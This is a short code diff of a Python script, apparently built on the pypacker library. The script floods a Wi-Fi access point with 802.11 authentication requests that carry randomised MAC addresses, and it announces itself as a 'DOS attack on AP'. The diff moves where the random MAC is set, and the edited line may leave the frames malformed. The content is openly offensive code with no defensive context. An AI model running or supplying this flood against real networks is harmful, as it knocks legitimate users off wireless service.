@@ -13,7 +13,6 @@ mon_sock	= psocket.SocketHndl(wlan_monitor_if)
 
 auth_req	= prism(len=24) +\
 		ieee80211.IEEE80211(type=ieee80211.MGMT_TYPE, subtype=ieee80211.M_AUTH, to_ds=1, from_ds=0) +\
-		ieee80211.IEEE80211.MGMTFrame(dst_s=ap_mac, bssid_s=ap_mac) +\
 		ieee80211.IEEE80211.Auth(auth_seq=1)
 
 print("starting DOS attack on AP %s" % ap_mac)
@@ -26,7 +25,7 @@ for i in range(10000):
 		print("%d pps" % (100 / diff) )
 
 	try:
-		auth_req[ieee80211.IEEE80211.MGMTFrame].src = pypacker.get_rnd_mac()
+		auth_req[ieee80211.IEEE80211.Auth].addr1 = pypacker.get_rnd_mac()
 		psocket.send(auth_req.bin())
 	except Exception as e:
 		mon_sock.close()
